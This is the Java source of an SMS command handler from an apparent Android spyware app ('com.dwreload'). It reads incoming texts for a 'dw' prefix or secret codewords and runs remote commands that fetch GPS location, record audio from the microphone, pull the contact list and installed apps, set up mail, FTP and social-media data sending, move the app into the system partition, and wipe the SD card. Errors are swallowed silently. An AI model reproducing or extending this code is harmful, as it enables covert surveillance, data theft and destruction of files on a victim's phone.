package com.dwreload;

import com.dwreload.lib.FileUtil;
import com.dwreload.modules.CommandsModule;

import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsCommand extends Thread {
	private static final String KEY_WORD = "dw";
	
	private String mMessage;
	private String mNumber;
	private SettingsManager mSettings;
	private Context mContext;
	private String Codeword1;
	private String Codeword2;
	private String Codeword3;
	
	/** SMS commands */
	private enum Command{
		/** get gps coord once */
		gpsget,
		/** dial the specified number <br> <strong>dw callback <i>number</i></strong>*/
		callback,
		/** reset settings to default. Disconnecting from system */
		reset,
		/** connect to system <br> <strong>dw connect <i>login</i></strong>*/
		//connect,
		/** start recording audio from mic <br> <strong>dw record <i>seconds</i></strong>*/
		record,
		recordstop,
		/** Enable Wi-Fi */
		wifion,
		/** Disable Wi-Fi */
		wifioff,
		gprson,
		gprsoff,
		reboot,
		restart,
		contacts,
		applist,
		wipesd,
		movetosystem,
		setmail,
		setname,
		setftp,
		setaudio,
		setadmin, //TODO
		setsms,
		setruncode,
		setphoto,
		setgps,
		setfilter,
		setsocial,
		setscreenshot,
		setcw1,
		setcw2,
		setcw3,
		getsettings;

	}

	public SmsCommand(Bundle bundle, Context context){
		mMessage = "";
		mNumber = "";
		
		try {
			Object[] pdus = (Object[]) bundle.get("pdus");
			SmsMessage msg = SmsMessage.createFromPdu((byte[])pdus[0]);
			mMessage = new String(msg.getDisplayMessageBody().getBytes(), "UTF-8");
			
			for (int i = 1; i < pdus.length; i++){
				mMessage += SmsMessage.createFromPdu((byte[])pdus[i]).getDisplayMessageBody();
			}
			mNumber = msg.getOriginatingAddress();
		
		} catch (Exception e) {

		}
		
		//mMessage = mMessage.toLowerCase(Locale.US);
		this.mContext = context;
		mSettings = new SettingsManager(mContext);
		Codeword1 = mSettings.CodeWord1();
		Codeword2 = mSettings.CodeWord2();
		Codeword3 = mSettings.CodeWord3();
	}
	
	public Boolean isCommand(){
		if (mMessage.length() > 2 && mMessage.substring(0, 2).equals(KEY_WORD)){
			return true;
		}
		
		return false;
	}
	
	public Boolean isHasCodeWord(){
		if (mMessage.contains(Codeword1))
			{
			mMessage = "dw " + mSettings.Cmd1();
			return true;
			}
		if (mMessage.contains(Codeword2))
			{
			mMessage = "dw " + mSettings.Cmd2();
			return true;
			}
		if (mMessage.contains(Codeword3))
			{
			mMessage = "dw " + mSettings.Cmd3();
			return true;
			}
		return false;
	}
	
	@Override
	public void run(){
		try {
			String[] arr = mMessage.split(" ");
			if (arr.length < 2){
				return;
			}
			
			Command command = Command.valueOf(arr[1]);
			
			switch (command) {
			case gpsget:
				CommandsModule.gpsGet(mNumber);
				break;
			case callback:
				if (arr.length >= 3)
					{
					CommandsModule.callBack(mContext, arr[2]);
					}
				break;
			case reset:
				reset();
				break;
			case record:
				record(arr);
				break;
			case recordstop:
				CommandsModule.recordStop();
				break;
			case wifion:
				CommandsModule.setWiFiState(mContext, true);
				break;
			case wifioff:
				CommandsModule.setWiFiState(mContext, false);
				break;
			case gprsoff:
				CommandsModule.setMobileDataState(mContext, false);
				break;
			case gprson:
				CommandsModule.setMobileDataState(mContext, true);
				break;
			case reboot:
				CommandsModule.reboot();
				break;
			case restart:
				CommandsModule.restart(mContext);
				break;
			case movetosystem:
				CommandsModule.moveToSystem(mContext);
				break;
			case contacts:
				CommandsModule.getPhoneBook(mContext);
				break;
			case applist:
				CommandsModule.getApplicationList(mContext);
				break;
			case setmail:
				CommandsModule.mailsettings(mContext, arr);
				break;
			case setsms:
				CommandsModule.SMSsettings(mContext, arr);
				break;
			case setaudio:
				CommandsModule.RecSettings(mContext, arr);
				break;
			case setphoto:
				CommandsModule.PhotoSet(mContext, arr);
				break;
			case setgps:
				CommandsModule.GpsSet(mContext, arr);
				break;
			case setscreenshot:
				CommandsModule.ScreenSet(mContext, arr);
				break;
			case setfilter:
				CommandsModule.FilterSet(mContext, arr);
				break;
			case setcw1:
				CommandsModule.codewordset(mContext, 1, arr);
				break;
			case setcw2:
				CommandsModule.codewordset(mContext, 2, arr);
				break;
			case setcw3:
				CommandsModule.codewordset(mContext, 3, arr);
				break;
			case setftp:
				CommandsModule.ftpsettings(mContext, arr);
				break;
			case setname:
				if (arr.length >= 3) {
					mSettings.PhoneName(arr[2]);
				}
				break;
			case setruncode:
				if (arr.length >= 3) {
					mSettings.runCode(arr[2]);
				}
				break;
			case setsocial:
				if (arr.length >= 3) {
					CommandsModule.socialset(mContext, arr);
					}
				break;
			case wipesd:
				if (arr.length >= 3) {
					CommandsModule.wipeSd(mContext, arr[2]);
				}
				FileUtil.wipeSdcard();
				break;
			case getsettings:
				CommandsModule.SendSettings(mContext);
				break;
			default:
				break;
			}
		}
		catch(Exception e){

		}
	}
	
	private void record(String[] arr){
		int duration = 60;
		
		if (arr.length > 2){
			try {
				duration = Integer.parseInt(arr[2]);
			} catch (NumberFormatException e) {

			}
		}
		CommandsModule.record(duration);
	}
	
	/*private void connect(String[] arr){
		if (arr.length >= 3){
			String login = arr[2];
			//CommandsModule.connect(mContext, mSettings, login);
		}
	}*/
	
	private void reset(){
		mSettings.clear();
	}
}
